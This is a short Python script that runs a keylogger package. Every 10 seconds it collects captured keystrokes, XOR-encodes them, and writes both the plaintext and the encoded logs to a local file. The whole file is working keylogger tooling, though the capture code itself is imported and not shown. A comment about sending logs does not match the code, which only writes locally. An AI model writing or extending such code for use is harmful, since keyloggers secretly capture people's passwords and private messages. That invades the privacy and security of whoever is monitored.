# Initialize components
import time

from keylogger.encryptors import XorEncryption
from keylogger.keyloggers import SimpleKeylogger
from keylogger.logwriters import ConsoleLogWriter
from keylogger.logwriters import FileLogWriter


def get_encrypted_log(encryptor_obj, logs_dict):
    encrypted_dict = {}
    for key, log in logs_dict.items():
        encrypted_dict[key] = encryptor_obj.encrypt(log)
    return encrypted_dict


if __name__ == '__main__':
    keylogger = SimpleKeylogger()
    # log_writer = ConsoleLogWriter()
    log_writer = FileLogWriter("logdict")
    encryptor = XorEncryption()
    seconds_to_sleep = 10

    # Start the keylogger
    keylogger.start()

    try:
        while keylogger.running:
            time.sleep(seconds_to_sleep)  # Send logs every 10 seconds
            logs = keylogger.get_log()
            if logs:
                encrypted_logs = get_encrypted_log(encryptor, logs)
                log_writer.write_log(logs)
                log_writer.write_log(encrypted_logs)
    except KeyboardInterrupt:
        keylogger.stop()
        print("Keylogger stopped.")
